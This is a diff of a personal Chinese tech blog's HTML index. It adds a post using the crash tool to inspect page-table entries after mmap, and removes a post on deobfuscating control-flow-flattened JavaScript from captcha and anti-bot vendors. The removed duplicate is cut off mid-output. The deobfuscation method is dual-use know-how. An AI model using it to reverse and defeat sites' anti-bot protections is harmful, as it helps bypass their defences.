@@ -168,6 +168,105 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-%E5%80%9F%E5%8A%A9crash%E5%B7%A5%E5%85%B7%E7%90%86%E8%A7%A3linux%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%86%85%E5%AD%98%E5%88%86%E9%85%8D/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="leveryd">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="leveryd的个人博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2021-12-26-%E5%80%9F%E5%8A%A9crash%E5%B7%A5%E5%85%B7%E7%90%86%E8%A7%A3linux%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%86%85%E5%AD%98%E5%88%86%E9%85%8D/" class="post-title-link" itemprop="url">借助crash工具理解linux系统的内存分配</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2021-12-26 15:33:56" itemprop="dateCreated datePublished" datetime="2021-12-26T15:33:56+08:00">2021-12-26</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/qxbp6PGpCqzFDSToIWn05Q">Linux下访问匿名页发生的神奇“化学反应”</a>，我看完这篇文章感觉对linux的内存分配又多了一点点理解，因此也想推荐给你读下。</p>
+<p>原文提出了一个问题：向<code>mmap</code>系统调用申请的内存”读时”没有导致物理可用内存减少，但是”随后写时”发现物理可用内存减少。</p>
+<p>原作者借助”分析内核源码”的收到来剖析问题原因，最终得到结论：第一次读匿名页后，然后写匿名页，先只读方式映射到0页，然后发生写时复制，分配物理页，虚拟页以可读可写的方式映射到此物理页。</p>
+<p>我自己总结一下，就是按照时间顺序来看，当对”可读可写的vma”先读后写时，”对应的页表项”应该是：</p>
+<ul>
+<li>在第一次读之前不存在</li>
+<li>在第一次读之后，第一次写之前，映射到固定位置，此时页表属性是只读</li>
+<li>在第一次写之后，映射到实际分配的物理内存，此时页表属性是可读可写</li>
+</ul>
+<p>可能这个结论你听着还是有点绕，并且我想你可能和我一样，也不想一下子就去研究”内核源码”来理解到底是怎么回事。</p>
+<p>那怎么能搞清楚原文的问题和结论呢？我发现一个神器<code>crash</code>，实际操作一番后，我感觉文章结论其实很好理解。下面就和我一起玩一玩<code>crash</code>，理解<code>mmap</code>分配的内存到底是怎么回事，也验证一下原文的结论是否正确。</p>
+<p>crash是一个可以用来调试linux内核崩溃的工具，也可以调试正在运行中的内核。它的安装和使用都很简单，理解本篇文章也不需要你之前接触过这个工具。</p>
+<h1 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h1><ul>
+<li><p>准备源码</p>
+<p>我们在”读内存之前”、”读内存后写内存前”、”写内存之后”这三个时刻分别调用<code>getchar()</code>停顿一下，方便我们用<code>crash</code>工具观察”页表项”</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-fj5pftdp tmp]# cat e.c</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;sys&#x2F;mman.h&gt;</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">  char* addr &#x3D; mmap (NULL, 1024, PROT_READ|PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS , - 1 , 0);</span><br><span class="line"></span><br><span class="line">  printf (&quot;addr: %lu pid:%d\n&quot;, addr, getpid()); &#x2F;&#x2F; 在读内存之前：页表项不存在</span><br><span class="line">  getchar();</span><br><span class="line"></span><br><span class="line">  printf (&quot;1:%s \n&quot;, addr);	&#x2F;&#x2F; 在读内存之后：映射了页表,页表项属性为&quot;只读&quot;</span><br><span class="line">  getchar();</span><br><span class="line"></span><br><span class="line">  strcpy(addr, &quot;AAAABBBB&quot;);	&#x2F;&#x2F; 在写内存之后：页表项属性为&quot;可读可写&quot;</span><br><span class="line"></span><br><span class="line">  printf (&quot;2:%s \n&quot;, addr);</span><br><span class="line">  getchar();</span><br><span class="line"></span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>上面的c程序编译运行后，我们就可以来分析”读内存之前”、”读内存后写内存前”、”写内存之后”这三个时刻的”页表项”是什么了。</p>
+</li>
+<li><p>使用<code>crash</code>分析”页表项”的变化</p>
+<p>首先简单说一下crash的安装和使用。</p>
+<p>如果你是centos系统，就可以用以下命令来安装</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">yum install crash  &#x2F;&#x2F; 安装crash工具</span><br><span class="line">debuginfo-install kernel-debuginfo-&#96;uname -r&#96;  &#x2F;&#x2F; 安装crash工具需要的内核文件</span><br></pre></td></tr></table></figure>
+
+<p>安装好后，使用下面的命令就可以调试”运行中的内核了”。vmlinux是带调试符号的内核文件。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-fj5pftdp ~]# crash &#x2F;usr&#x2F;lib&#x2F;debug&#x2F;usr&#x2F;lib&#x2F;modules&#x2F;3.10.0-1160.11.1.el7.x86_64&#x2F;vmlinux &#x2F;dev&#x2F;mem</span><br></pre></td></tr></table></figure>
+
+<p>下面来看一下”页表项”的变化：我在程序三次<code>getchar()</code>时，使用<code>crash</code>的<code>vtop</code>命令查看”虚拟地址”对应的页表</p>
+<p><img src="https://user-images.githubusercontent.com/1846319/146151529-65a92898-2a18-48a5-958f-5076d5d94442.png" alt="image"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">crash&gt; set 31880    &#x2F;&#x2F; 31880是进程号</span><br><span class="line">    PID: 31880</span><br><span class="line">COMMAND: &quot;a.out&quot;</span><br><span class="line">   TASK: ffff9396f6a7a100  [THREAD_INFO: ffff93983cbe4000]</span><br><span class="line">    CPU: 1</span><br><span class="line">  STATE: TASK_INTERRUPTIBLE</span><br><span class="line">crash&gt; px 139812061335552  &#x2F;&#x2F; 十进制转成十六进制。139812061335552是mmap的返回值</span><br><span class="line">$1 &#x3D; 0x7f2888405000</span><br><span class="line">crash&gt; vtop 0x7f2888405000  &#x2F;&#x2F; vtop指令用来查看&quot;虚拟地址&quot;对应的&quot;物理地址&quot;</span><br><span class="line">VIRTUAL     PHYSICAL</span><br><span class="line">7f2888405000  (not mapped)  &#x2F;&#x2F; 这里可以看出来，此时没有映射到对应的&quot;物理地址&quot;</span><br><span class="line"></span><br><span class="line">   PGD: 16abd67f0 &#x3D;&gt; 16b7d7067</span><br><span class="line">   PUD: 16b7d7510 &#x3D;&gt; 170f95067</span><br><span class="line">   PMD: 170f95210 &#x3D;&gt; 160fd5067</span><br><span class="line">   PTE: 160fd5028 &#x3D;&gt; 0      &#x2F;&#x2F; &quot;页表项&quot;为0，其中的P标志位为0，表示&quot;页表项&quot;不存在，没有映射到对应的&quot;物理地址&quot;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">crash&gt; vtop 0x7f2888405000</span><br><span class="line">VIRTUAL     PHYSICAL</span><br><span class="line">7f2888405000  117d65000</span><br><span class="line">....</span><br><span class="line">   PTE: 160fd5028 &#x3D;&gt; 8000000117d65225</span><br><span class="line">  PAGE: 117d65000</span><br><span class="line"></span><br><span class="line">      PTE         PHYSICAL   FLAGS</span><br><span class="line">8000000117d65225  117d65000  (PRESENT|USER|ACCESSED|NX)   &#x2F;&#x2F; 此时&quot;页表项&quot;有了映射关系，说明此时只能读不能写</span><br><span class="line"></span><br><span class="line">crash&gt; vtop 0x7f2888405000</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">      PTE         PHYSICAL   FLAGS</span><br><span class="line">80000003b0cf5867  3b0cf5000  (PRESENT|RW|USER|ACCESSED|DIRTY|NX)    &#x2F;&#x2F; RW标志表明此时可以写</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<p>如上面指令结果中的注释：执行三次vtop指令时，页表项(PTE)中的”FLAGS”都不断变化，读写权限确实像”问题背景”中那样变化。可以看出来，结论是没有问题的</p>
+<p>怎么样，crash验证这个结论是不是很简单？</p>
+</li>
+</ul>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>crash很好用，如果你想了解更多crash工具的应用场景，可以参考 <a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/040W19-CPF0VnUvwFSKiXw">解决Linux内核问题实用技巧之 - Crash工具结合/dev/mem任意修改内存</a></p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-%E5%85%A8%E6%B5%81%E9%87%8F%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B%E7%B3%BB%E7%BB%9F%E7%9A%84%E6%80%A7%E8%83%BD%E5%88%86%E6%9E%90/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -395,215 +494,6 @@
 <li><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/f10736931b93">【bash】关于 /dev/tcp/${HOST}/${PORT}</a></li>
 <li><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/80d6b5a61372">Bash /dev/(tcp|udp)/${HOST}/${PORT} 分析</a></li>
 </ul>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-%E5%8F%8D%E6%B7%B7%E6%B7%86%22%E6%8E%A7%E5%88%B6%E6%B5%81%E5%B9%B3%E5%9D%A6%E5%8C%96%22/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="leveryd">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="leveryd的个人博客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2021-12-26-%E5%8F%8D%E6%B7%B7%E6%B7%86%22%E6%8E%A7%E5%88%B6%E6%B5%81%E5%B9%B3%E5%9D%A6%E5%8C%96%22/" class="post-title-link" itemprop="url">反混淆"控制流平坦化"</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2021-12-26 15:33:56" itemprop="dateCreated datePublished" datetime="2021-12-26T15:33:56+08:00">2021-12-26</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h1 id="问题背景"><a href="#问题背景" class="headerlink" title="问题背景"></a>问题背景</h1><p>业务逻辑非常依赖前端的安全产品，比如<a target="_blank" rel="noopener" href="https://www.geetest.com/">极验</a>、<a target="_blank" rel="noopener" href="https://www.dingxiang-inc.com/docs/detail/captcha">顶象-无感验证</a>、瑞数 等都会对前端代码做混淆。其中有一种强度较高的混淆方式，叫”控制流平坦化”。</p>
-<blockquote>
-<p>“控制流平坦化”是将一些顺序执行的代码，变化成阅读难度更大的<code>while-switch-case</code>或者<code>for-switch-case</code>代码。可以见<a target="_blank" rel="noopener" href="https://github.com/Tsaiboss/ControlFlow">ControlFlow</a>这个项目的例子。</p>
-</blockquote>
-<p>如果能够”反混淆”这种”控制流平坦化”混淆后的代码，就能让代码变得更容易阅读一些。</p>
-<p>本文介绍”反控制流平坦化”的思路和实践过程，最终可以反混淆<code>ControlFlow</code>和<code>https://obfuscator.io/</code>两个工具的”控制流平坦化”。</p>
-<p>反混淆思路：</p>
-<ul>
-<li>按照”while-switch-case”执行顺序，拼接case语句</li>
-</ul>
-<h1 id="实现过程"><a href="#实现过程" class="headerlink" title="实现过程"></a>实现过程</h1><ul>
-<li><p>怎么实现？</p>
-<p>分为两步：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">* 第一步获取case块的执行顺序</span><br><span class="line">* 第二部根据case块的执行顺序，拼接case块</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>怎么获取”case块的执行顺序”？</p>
-<p>思路是在每个case块中”注入代码”，然后在浏览器中执行js代码，执行过程”注入代码”就可以记录执行顺序。我理解这个类似”软件测试”中计算”代码覆盖率”时用到的插桩。</p>
-<p>原始代码如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">while (!![])&#123;</span><br><span class="line">  switch (...)&#123;</span><br><span class="line">    case &quot;0&quot;:</span><br><span class="line">      ...</span><br><span class="line">    case &quot;1&quot;:</span><br><span class="line">      ...</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>插桩后,代码如下</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 利用&quot;插桩&quot;记录while-switch-case执行顺序</span><br><span class="line">&#x2F;&#x2F; 集合 &#x3D; &#123;while id: [case1节点, case2节点，case3节点，case2节点]&#125;</span><br><span class="line"></span><br><span class="line">let while_id_stack &#x3D; []  &#x2F;&#x2F; 栈</span><br><span class="line"></span><br><span class="line">let collection &#x3D; &#123;&#125;</span><br><span class="line"></span><br><span class="line">while (!![])&#123;</span><br><span class="line">  while_statement_id &#x3D; 111</span><br><span class="line">  while_id_stack.push(while_statement_id)</span><br><span class="line">  collection[while_statement_id] &#x3D; []</span><br><span class="line"></span><br><span class="line">  switch (...)&#123;</span><br><span class="line">    case &quot;0&quot;:</span><br><span class="line">      case_statement_id &#x3D; 222</span><br><span class="line">      while_id_on_stack_op &#x3D; while_id_stack[while_id_stack.length-1]</span><br><span class="line">      collection[while_id_on_stack_op].push(case_statement_id)</span><br><span class="line">      ...</span><br><span class="line">    case &quot;1&quot;:</span><br><span class="line">      ...</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  while_id_stack.pop()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">record(collection)</span><br></pre></td></tr></table></figure>
-
-<p>浏览器运行后，集合中就存放有case节点的执行顺序。</p>
-<p>上面都是伪代码，具体实现见 hook.js</p>
-</li>
-<li><p>怎么拼接case块？</p>
-<p>伪代码如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">集合 &#x3D; &#123;while id: [case1节点, case2节点，case3节点，case2节点]&#125;</span><br><span class="line"></span><br><span class="line">函数1：</span><br><span class="line"></span><br><span class="line">  遍历ast，如果遇到while语句 &#123;</span><br><span class="line">    得到当前while id</span><br><span class="line"></span><br><span class="line">    if while id in 集合:</span><br><span class="line">      顺序拼接各个case块内容</span><br><span class="line"></span><br><span class="line">      用&quot;拼接后的顺序语句&quot;替换&quot;while语句&quot;</span><br><span class="line"></span><br><span class="line">      从集合中删除 while id记录</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">while 集合中还有元素:</span><br><span class="line"></span><br><span class="line">  调用 函数1</span><br></pre></td></tr></table></figure>
-
-<p>具体实现见 simple_decode.js</p>
-</li>
-</ul>
-<h1 id="实现结果"><a href="#实现结果" class="headerlink" title="实现结果"></a>实现结果</h1><p>可以将”while-switch-case代码块”变成”顺序执行的代码块”。</p>
-<p>比如 PlayWithObfuscator/tests/encoded_js/simple.js 中的混淆后的代码</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">while (!![]) &#123;</span><br><span class="line">    switch (_0xcgcd3c[_0x3922ce++]) &#123;</span><br><span class="line">        case &quot;0&quot;:</span><br><span class="line">            if (_0x33g15b &#x3D; _0x5153cd.charCodeAt(_0xeea791 +&#x3D; .75), _0x33g15b &gt; 255) throw new t(&quot;&#39;btoa&#39; failed: The string to be encoded contains characters outside of the Latin1 range.&quot;);</span><br><span class="line">            continue;</span><br><span class="line"></span><br><span class="line">        case &quot;1&quot;:</span><br><span class="line">            _0xed1fcd &#x3D; _0xed1fcd &lt;&lt; 8 | _0x33g15b;</span><br><span class="line">            continue;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    break;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>转换成 阅读性更好一些的代码</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if (_0x33g15b &#x3D; _0x5153cd.charCodeAt(_0xeea791 +&#x3D; .75), _0x33g15b &gt; 255) throw new t(&quot;&#39;btoa&#39; failed: The string to be encoded contains characters outside of the Latin1 range.&quot;);</span><br><span class="line">_0xed1fcd &#x3D; _0xed1fcd &lt;&lt; 8 | _0x33g15b;</span><br></pre></td></tr></table></figure>
-
-<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>目前属于demo阶段，可以对以下工具的”控制流平坦化”做反混淆：</p>
-<ul>
-<li><a target="_blank" rel="noopener" href="https://obfuscator.io/">https://obfuscator.io/</a></li>
-<li><a target="_blank" rel="noopener" href="https://github.com/Tsaiboss/ControlFlow">https://github.com/Tsaiboss/ControlFlow</a></li>
-</ul>
-<p>测试结果在 <a target="_blank" rel="noopener" href="https://github.com/leveryd/PlayWithObfuscator/tree/main/tests">tests目录</a> 看到</p>
-<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/a314131070/article/details/106567825?spm=1001.2014.3001.5501">JS反混淆-控制流平展（一）</a></p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-%E5%80%9F%E5%8A%A9crash%E5%B7%A5%E5%85%B7%E7%90%86%E8%A7%A3linux%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%86%85%E5%AD%98%E5%88%86%E9%85%8D/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="leveryd">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="leveryd的个人博客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2021-12-26-%E5%80%9F%E5%8A%A9crash%E5%B7%A5%E5%85%B7%E7%90%86%E8%A7%A3linux%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%86%85%E5%AD%98%E5%88%86%E9%85%8D/" class="post-title-link" itemprop="url">借助crash工具理解linux系统的内存分配</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2021-12-26 15:33:56" itemprop="dateCreated datePublished" datetime="2021-12-26T15:33:56+08:00">2021-12-26</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/qxbp6PGpCqzFDSToIWn05Q">Linux下访问匿名页发生的神奇“化学反应”</a>，我看完这篇文章感觉对linux的内存分配又多了一点点理解，因此也想推荐给你读下。</p>
-<p>原文提出了一个问题：向<code>mmap</code>系统调用申请的内存”读时”没有导致物理可用内存减少，但是”随后写时”发现物理可用内存减少。</p>
-<p>原作者借助”分析内核源码”的收到来剖析问题原因，最终得到结论：第一次读匿名页后，然后写匿名页，先只读方式映射到0页，然后发生写时复制，分配物理页，虚拟页以可读可写的方式映射到此物理页。</p>
-<p>我自己总结一下，就是按照时间顺序来看，当对”可读可写的vma”先读后写时，”对应的页表项”应该是：</p>
-<ul>
-<li>在第一次读之前不存在</li>
-<li>在第一次读之后，第一次写之前，映射到固定位置，此时页表属性是只读</li>
-<li>在第一次写之后，映射到实际分配的物理内存，此时页表属性是可读可写</li>
-</ul>
-<p>可能这个结论你听着还是有点绕，并且我想你可能和我一样，也不想一下子就去研究”内核源码”来理解到底是怎么回事。</p>
-<p>那怎么能搞清楚原文的问题和结论呢？我发现一个神器<code>crash</code>，实际操作一番后，我感觉文章结论其实很好理解。下面就和我一起玩一玩<code>crash</code>，理解<code>mmap</code>分配的内存到底是怎么回事，也验证一下原文的结论是否正确。</p>
-<p>crash是一个可以用来调试linux内核崩溃的工具，也可以调试正在运行中的内核。它的安装和使用都很简单，理解本篇文章也不需要你之前接触过这个工具。</p>
-<h1 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h1><ul>
-<li><p>准备源码</p>
-<p>我们在”读内存之前”、”读内存后写内存前”、”写内存之后”这三个时刻分别调用<code>getchar()</code>停顿一下，方便我们用<code>crash</code>工具观察”页表项”</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-fj5pftdp tmp]# cat e.c</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;sys&#x2F;mman.h&gt;</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">  char* addr &#x3D; mmap (NULL, 1024, PROT_READ|PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS , - 1 , 0);</span><br><span class="line"></span><br><span class="line">  printf (&quot;addr: %lu pid:%d\n&quot;, addr, getpid()); &#x2F;&#x2F; 在读内存之前：页表项不存在</span><br><span class="line">  getchar();</span><br><span class="line"></span><br><span class="line">  printf (&quot;1:%s \n&quot;, addr);	&#x2F;&#x2F; 在读内存之后：映射了页表,页表项属性为&quot;只读&quot;</span><br><span class="line">  getchar();</span><br><span class="line"></span><br><span class="line">  strcpy(addr, &quot;AAAABBBB&quot;);	&#x2F;&#x2F; 在写内存之后：页表项属性为&quot;可读可写&quot;</span><br><span class="line"></span><br><span class="line">  printf (&quot;2:%s \n&quot;, addr);</span><br><span class="line">  getchar();</span><br><span class="line"></span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>上面的c程序编译运行后，我们就可以来分析”读内存之前”、”读内存后写内存前”、”写内存之后”这三个时刻的”页表项”是什么了。</p>
-</li>
-<li><p>使用<code>crash</code>分析”页表项”的变化</p>
-<p>首先简单说一下crash的安装和使用。</p>
-<p>如果你是centos系统，就可以用以下命令来安装</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">yum install crash  &#x2F;&#x2F; 安装crash工具</span><br><span class="line">debuginfo-install kernel-debuginfo-&#96;uname -r&#96;  &#x2F;&#x2F; 安装crash工具需要的内核文件</span><br></pre></td></tr></table></figure>
-
-<p>安装好后，使用下面的命令就可以调试”运行中的内核了”。vmlinux是带调试符号的内核文件。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-fj5pftdp ~]# crash &#x2F;usr&#x2F;lib&#x2F;debug&#x2F;usr&#x2F;lib&#x2F;modules&#x2F;3.10.0-1160.11.1.el7.x86_64&#x2F;vmlinux &#x2F;dev&#x2F;mem</span><br></pre></td></tr></table></figure>
-
-<p>下面来看一下”页表项”的变化：我在程序三次<code>getchar()</code>时，使用<code>crash</code>的<code>vtop</code>命令查看”虚拟地址”对应的页表</p>
-<p><img src="https://user-images.githubusercontent.com/1846319/146151529-65a92898-2a18-48a5-958f-5076d5d94442.png" alt="image"></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">crash&gt; set 31880    &#x2F;&#x2F; 31880是进程号</span><br><span class="line">    PID: 31880</span><br><span class="line">COMMAND: &quot;a.out&quot;</span><br><span class="line">   TASK: ffff9396f6a7a100  [THREAD_INFO: ffff93983cbe4000]</span><br><span class="line">    CPU: 